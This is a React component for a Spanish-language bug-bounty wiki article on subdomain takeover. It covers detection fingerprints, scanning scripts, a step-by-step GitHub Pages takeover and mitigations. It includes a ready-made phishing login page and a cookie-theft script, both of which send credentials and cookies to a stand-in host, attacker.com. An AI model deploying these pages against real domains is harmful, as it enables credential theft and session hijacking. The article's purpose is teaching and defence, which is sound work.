/**
 * SUBDOMAIN TAKEOVER
 * Tomar control de subdominios abandonados
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SubdomainTakeoverContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Subdomain Takeover - El DNS Abandonado">
        <Paragraph>
          <Strong>Subdomain Takeover</Strong> ocurre cuando un subdominio apunta (DNS CNAME) 
          a un servicio de terceros que ya no existe o no está reclamado. Atacante puede 
          registrar ese servicio y controlar el subdominio.
        </Paragraph>

        <AlertDanger title="Impacto de Subdomain Takeover">
          <ul className="mt-2 space-y-1">
            <ListItem>🎯 Phishing desde dominio legítimo</ListItem>
            <ListItem>🍪 Robo de cookies (subdomain cookie scope)</ListItem>
            <ListItem>🔐 Bypass de CSP (trusted-types desde subdominio)</ListItem>
            <ListItem>📧 Enviar emails desde dominio confiable</ListItem>
            <ListItem>⚡ Inyectar JavaScript en página principal</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="como-funciona" title="1. Cómo Ocurre un Takeover">
        <CodeBlock
          language="bash"
          title="Escenario vulnerable típico"
          code={`# 1. Empresa configura subdominio para proyecto temporal
blog.victim.com → CNAME → victim-blog.herokuapp.com

# 2. Proyecto se cancela, Heroku app se elimina
# Pero DNS CNAME NO se elimina

# 3. DNS aún apunta a Heroku app inexistente
$ dig blog.victim.com
blog.victim.com. 300 IN CNAME victim-blog.herokuapp.com.
victim-blog.herokuapp.com. → NXDOMAIN  # ← No existe ✓

# 4. Atacante registra victim-blog.herokuapp.com
# Ahora atacante controla blog.victim.com ✓`}
        />

        <AlertWarning>
          Si <InlineCode>dig</InlineCode> muestra CNAME pero el destino da NXDOMAIN o 
          error 404 específico del servicio → POTENCIALMENTE VULNERABLE.
        </AlertWarning>
      </Section>

      <Section id="servicios-vulnerables" title="2. Servicios Cloud Comunes">
        <Subsection title="GitHub Pages">
          <CodeBlock
            language="bash"
            title="Detectar takeover de GitHub Pages"
            code={`$ dig docs.victim.com
docs.victim.com. 300 IN CNAME victim.github.io.

$ curl https://docs.victim.com
# Si respuesta:
"There isn't a GitHub Pages site here."

# → VULNERABLE ✓

# Exploit:
# 1. Crear repo: victim/victim.github.io
# 2. Agregar CNAME file con: docs.victim.com
# 3. Ahora atacante controla docs.victim.com`}
          />
          
          <HighlightBox color="red">
            <Strong>Fingerprint GitHub Pages:</Strong> Error "There isn't a GitHub Pages site here."
          </HighlightBox>
        </Subsection>

        <Subsection title="Heroku">
          <CodeBlock
            language="bash"
            title="Detectar takeover de Heroku"
            code={`$ dig app.victim.com
app.victim.com. 300 IN CNAME victim-app.herokuapp.com.

$ curl https://app.victim.com
# Si respuesta:
"No such app"

# → VULNERABLE ✓

# Exploit:
# 1. heroku create victim-app
# 2. Desplegar contenido malicioso
# 3. app.victim.com ahora apunta a app del atacante`}
          />
          
          <HighlightBox color="red">
            <Strong>Fingerprint Heroku:</Strong> Error "No such app"
          </HighlightBox>
        </Subsection>

        <Subsection title="AWS S3">
          <CodeBlock
            language="bash"
            title="Detectar takeover de S3"
            code={`$ dig static.victim.com
static.victim.com. 300 IN CNAME victim-static.s3.amazonaws.com.

$ curl https://static.victim.com
# Si respuesta XML:
<Error>
  <Code>NoSuchBucket</Code>
  <Message>The specified bucket does not exist</Message>
</Error>

# → VULNERABLE ✓

# Exploit:
# 1. Crear bucket S3: victim-static
# 2. Configurar static website hosting
# 3. Upload malicious index.html
# 4. static.victim.com ahora servido por atacante`}
          />
          
          <HighlightBox color="red">
            <Strong>Fingerprint S3:</Strong> XML con "NoSuchBucket"
          </HighlightBox>
        </Subsection>

        <Subsection title="Azure">
          <CodeBlock
            language="bash"
            title="Detectar takeover de Azure"
            code={`$ dig cdn.victim.com
cdn.victim.com. 300 IN CNAME victim.azurewebsites.net.

$ curl https://cdn.victim.com
# Si respuesta:
"404 - Web app does not exist"

# → VULNERABLE ✓

# Exploit:
# 1. Registrar Azure app: victim.azurewebsites.net
# 2. Desplegar contenido malicioso
# 3. cdn.victim.com controlado por atacante`}
          />
        </Subsection>

        <Subsection title="AWS CloudFront">
          <CodeBlock
            language="bash"
            title="CloudFront takeover"
            code={`$ dig assets.victim.com
assets.victim.com. 300 IN CNAME d111111abcdef8.cloudfront.net.

$ curl https://assets.victim.com
# Error:
<Error>
  <Code>NoSuchDistribution</Code>
</Error>

# → VULNERABLE ✓

# Exploit (más complejo):
# 1. Crear CloudFront distribution
# 2. Configurar alternate domain: assets.victim.com
# 3. Si victim.com NO tiene CAA record restrictivo → Takeover posible`}
          />
        </Subsection>
      </Section>

      <Section id="deteccion-masiva" title="3. Detección Masiva de Subdominios">
        <CodeBlock
          language="bash"
          title="Enumerar subdominios con Subfinder"
          code={`# Instalar subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Enumerar subdominios
subfinder -d victim.com -o subdomains.txt

# Resultado:
# www.victim.com
# blog.victim.com
# api.victim.com
# old-app.victim.com
# test.victim.com
# ... 500+ subdominios`}
        />

        <CodeBlock
          language="bash"
          title="Verificar takeovers con SubOver"
          code={`# Instalar SubOver
go install github.com/Ice3man543/SubOver@latest

# Verificar todos los subdominios
subover -l subdomains.txt -v

# Output:
[!] blog.victim.com → victim-blog.herokuapp.com [Heroku]
[!] docs.victim.com → victim.github.io [GitHub Pages]
[!] cdn.victim.com → d12345.cloudfront.net [CloudFront]

# ✓ 3 takeovers potenciales detectados`}
        />

        <CodeBlock
          language="python"
          title="Script custom para verificar CNAMEs"
          code={`import dns.resolver
import requests
import concurrent.futures

# Fingerprints de servicios vulnerables
FINGERPRINTS = {
    'github.io': "There isn't a GitHub Pages site here",
    'herokuapp.com': "No such app",
    's3.amazonaws.com': "NoSuchBucket",
    'azurewebsites.net': "404 - Web app does not exist",
    'cloudfront.net': "NoSuchDistribution"
}

def check_subdomain(subdomain):
    try:
        # Resolver CNAME
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname = str(answers[0].target)
        
        # Verificar si apunta a servicio conocido
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname:
                # Probar HTTP
                try:
                    response = requests.get(f'https://{subdomain}', timeout=5)
                    
                    if fingerprint in response.text:
                        print(f'[!] VULNERABLE: {subdomain} → {cname}')
                        print(f'    Fingerprint: {fingerprint}')
                        return subdomain
                except:
                    pass
    except:
        pass
    
    return None

# Leer subdominios
with open('subdomains.txt') as f:
    subdomains = [line.strip() for line in f]

# Verificar en paralelo
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(check_subdomain, subdomains)
    
vulnerable = [r for r in results if r]
print(f'\\n[+] Found {len(vulnerable)} potential takeovers')`}
        />
      </Section>

      <Section id="exploit-completo" title="4. Exploit Completo - GitHub Pages Takeover">
        <CodeBlock
          language="bash"
          title="Paso 1: Verificar vulnerabilidad"
          code={`$ dig docs.victim.com
docs.victim.com. 300 IN CNAME victim.github.io.

$ curl https://docs.victim.com
There isn't a GitHub Pages site here.

# ✓ Vulnerable - GitHub Pages no existe`}
        />

        <CodeBlock
          language="bash"
          title="Paso 2: Crear repositorio GitHub"
          code={`# Opción 1: Crear repo con username 'victim' (requiere username disponible)
# Opción 2: Usar organization

# Crear repo:
# Nombre: victim.github.io  (si username es 'victim')
# O: victim/victim.github.io (si es organization)

# Clonar
git clone https://github.com/victim/victim.github.io
cd victim.github.io`}
        />

        <CodeBlock
          language="bash"
          title="Paso 3: Configurar custom domain"
          code={`# Crear archivo CNAME
echo "docs.victim.com" > CNAME

# Crear página de demostración
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Subdomain Takeover PoC</title>
</head>
<body>
  <h1>🚨 Subdomain Takeover Proof of Concept</h1>
  <p>This subdomain (docs.victim.com) has been taken over.</p>
  <p>Reported by: [YOUR_NAME]</p>
  <script>
    // Demostrar acceso a cookies del dominio padre
    console.log('Cookies:', document.cookie);
    alert('Subdomain Takeover PoC - Cookie access: ' + document.cookie);
  </script>
</body>
</html>
EOF

# Commit y push
git add .
git commit -m "PoC: Subdomain takeover"
git push origin main`}
        />

        <CodeBlock
          language="bash"
          title="Paso 4: Habilitar GitHub Pages"
          code={`# En GitHub repo settings:
# 1. Ir a Settings → Pages
# 2. Source: Deploy from main branch
# 3. Esperar ~1 minuto

# Verificar
curl https://docs.victim.com
# → PoC page cargada ✓

# Ahora atacante controla docs.victim.com completamente`}
        />
      </Section>

      <Section id="phishing-attack" title="5. Ataque de Phishing Avanzado">
        <CodeBlock
          language="html"
          title="Página de phishing en subdomain tomado"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Victim Corp - Employee Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
    }
    .logo { text-align: center; margin-bottom: 30px; }
    input { width: 100%; padding: 10px; margin: 10px 0; }
    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="logo">
    <h1>🏢 Victim Corp</h1>
    <p>Employee Login Portal</p>
  </div>
  
  <form id="loginForm">
    <input type="email" name="email" placeholder="Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Sign In</button>
  </form>
  
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = e.target.email.value;
      const password = e.target.password.value;
      
      // Exfiltrar credenciales
      await fetch('https://attacker.com/phish', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          subdomain: 'login.victim.com',
          cookies: document.cookie,
          referrer: document.referrer
        })
      });
      
      // Redirigir a login real
      window.location = 'https://victim.com/login?error=invalid';
    });
  </script>
</body>
</html>

<!-- Víctimas ven URL: https://login.victim.com
SSL cert válido (*.victim.com)
Dominio legítimo → Alta conversión de phishing ✓
-->`}
        />
      </Section>

      <Section id="cookie-theft" title="6. Robo de Cookies del Dominio Padre">
        <CodeBlock
          language="html"
          title="Acceso a cookies desde subdomain takeover"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Subdomain Takeover - Cookie Theft</h1>
  
  <script>
    // Subdomain puede leer cookies del dominio padre
    // si cookies NO tienen flag 'Domain' específico
    
    const cookies = document.cookie;
    console.log('Stolen cookies:', cookies);
    
    // Cookies con Domain=.victim.com son accesibles desde:
    // www.victim.com
    // app.victim.com
    // takeover.victim.com ← Subdomain tomado ✓
    
    // Exfiltrar
    fetch('https://attacker.com/cookie-steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: cookies,
        subdomain: window.location.hostname
      })
    });
    
    // También puede SETEAR cookies para dominio padre
    document.cookie = 'admin=true; Domain=.victim.com; Path=/';
    // → Cookie poisoning attack ✓
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="herramientas" title="7. Herramientas de Detección">
        <Subsection title="can-i-take-over-xyz">
          <CodeBlock
            language="bash"
            title="Lista completa de fingerprints"
            code={`# GitHub repo: EdOverflow/can-i-take-over-xyz
# Contiene fingerprints de 70+ servicios

# Servicios cubiertos:
# - AWS (S3, CloudFront, Elastic Beanstalk)
# - Azure (Websites, CDN, Traffic Manager)
# - GitHub Pages
# - Heroku
# - WordPress.com
# - Shopify
# - Tumblr
# - Bitbucket
# - Cargo Collective
# - And many more...

# Usar como referencia para fingerprints actualizados`}
          />
        </Subsection>

        <Subsection title="Nuclei Templates">
          <CodeBlock
            language="bash"
            title="Escanear con Nuclei"
            code={`# Instalar Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Actualizar templates
nuclei -update-templates

# Escanear subdominios para takeovers
cat subdomains.txt | nuclei -t takeovers/

# Templates incluyen:
# - aws-bucket-takeover.yaml
# - azure-takeover.yaml
# - github-takeover.yaml
# - heroku-takeover.yaml
# - And 50+ more services`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir Subdomain Takeovers">
          Mantener inventario DNS actualizado y eliminar CNAMEs huérfanos.
        </AlertDanger>

        <Subsection title="1. Eliminar CNAMEs Antes de Eliminar Servicios">
          <CodeBlock
            language="bash"
            title="✅ Proceso seguro de decommissioning"
            code={`# ORDEN CORRECTO:

# 1. PRIMERO - Eliminar DNS record
# En Cloudflare/Route53/etc:
# Eliminar: blog.victim.com CNAME victim-blog.herokuapp.com

# 2. Esperar propagación DNS (24-48h)
dig blog.victim.com
# NXDOMAIN ✓

# 3. DESPUÉS - Eliminar servicio cloud
heroku apps:destroy victim-blog

# ❌ INCORRECTO:
# 1. Eliminar Heroku app
# 2. Olvidar DNS → VULNERABLE`}
          />
        </Subsection>

        <Subsection title="2. Monitoreo Continuo de DNS">
          <CodeBlock
            language="python"
            title="✅ Script de monitoreo automático"
            code={`import dns.resolver
import requests
from datetime import datetime

def check_dns_health():
    # Subdominios que deberían existir
    expected_subdomains = {
        'www.victim.com': 'CNAME cdn.victim.com',
        'api.victim.com': 'A 1.2.3.4',
        'app.victim.com': 'CNAME app-prod.herokuapp.com'
    }
    
    for subdomain, expected in expected_subdomains.items():
        try:
            # Resolver DNS
            record_type = expected.split()[0]
            answers = dns.resolver.resolve(subdomain, record_type)
            
            # Verificar que responde HTTP 200
            response = requests.get(f'https://{subdomain}', timeout=5)
            
            if response.status_code not in [200, 301, 302]:
                print(f'[!] ALERT: {subdomain} returned {response.status_code}')
                send_alert(f'{subdomain} may be vulnerable to takeover')
                
        except dns.resolver.NXDOMAIN:
            print(f'[!] CRITICAL: {subdomain} NXDOMAIN - potential takeover')
            send_alert(f'{subdomain} DNS not resolving')
        except:
            print(f'[!] WARNING: {subdomain} not accessible')

# Ejecutar cada hora
schedule.every().hour.do(check_dns_health)`}
          />
        </Subsection>

        <Subsection title="3. CAA Records para Prevenir Certificate Takeover">
          <CodeBlock
            language="bash"
            title="✅ Configurar CAA records"
            code={`# CAA (Certification Authority Authorization)
# Especifica qué CAs pueden emitir certs para tu dominio

# Configurar en DNS:
victim.com. IN CAA 0 issue "letsencrypt.org"
victim.com. IN CAA 0 issue "digicert.com"
victim.com. IN CAA 0 issuewild ";"  # Prohibir wildcards

# Esto previene que atacante obtenga SSL cert para
# subdomain tomado si usa CA diferente`}
          />
        </Subsection>

        <Subsection title="4. Reclamar Proactivamente Recursos Cloud">
          <CodeBlock
            language="bash"
            title="✅ Mantener servicios aunque no usados"
            code={`# Opción 1: Mantener placeholder apps
# En Heroku, S3, etc., mantener apps mínimas

# Opción 2: Wildcard registrations
# Registrar: *.victim.com en servicios cloud
# Previene que atacante use nombre similar

# Opción 3: Monitoring script que registra
# automáticamente servicios si detecta DNS apuntando a ellos`}
          />
        </Subsection>

        <Subsection title="5. Política de Cookies Segura">
          <CodeBlock
            language="javascript"
            title="✅ Cookies con Domain específico"
            code={`// ❌ VULNERABLE - Cookie accesible desde subdominios
res.cookie('session', token, {
  domain: '.victim.com',  // ← Accesible desde TODOS los subdominios
  httpOnly: true,
  secure: true
});

// ✅ SEGURO - Cookie solo en dominio exacto
res.cookie('session', token, {
  // NO setear domain → Solo accesible en www.victim.com
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Si subdomain es tomado, NO puede leer estas cookies ✓`}
          />
        </Subsection>

        <Subsection title="6. Content Security Policy con Subdomains">
          <CodeBlock
            language="javascript"
            title="✅ CSP restrictivo"
            code={`// ❌ VULNERABLE - Confiar en todos los subdominios
res.setHeader('Content-Security-Policy', 
  "script-src 'self' *.victim.com"
);
// Si blog.victim.com es tomado → Puede inyectar JS ✓

// ✅ SEGURO - Listar subdominios específicos
res.setHeader('Content-Security-Policy', 
  "script-src 'self' cdn.victim.com api.victim.com"
);
// Solo subdominios específicos permitidos`}
          />
        </Subsection>

        <Subsection title="7. Auditoría Regular de DNS">
          <CodeBlock
            language="bash"
            title="✅ Script mensual de auditoría"
            code={`#!/bin/bash
# dns-audit.sh - Verificar CNAMEs huérfanos

# Obtener todos los CNAMEs
dig victim.com ANY +noall +answer | grep CNAME > cnames.txt

# Verificar cada CNAME
while read line; do
  subdomain=$(echo $line | awk '{print $1}')
  target=$(echo $line | awk '{print $5}')
  
  # Intentar resolver target
  if ! dig $target +short > /dev/null 2>&1; then
    echo "[!] ORPHAN CNAME: $subdomain → $target (NXDOMAIN)"
  fi
done < cnames.txt

# Ejecutar mensualmente en cron:
# 0 0 1 * * /root/dns-audit.sh | mail -s "DNS Audit" security@victim.com`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Open Redirect</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/open-redirect`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Bypassear validación de redirects para phishing</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
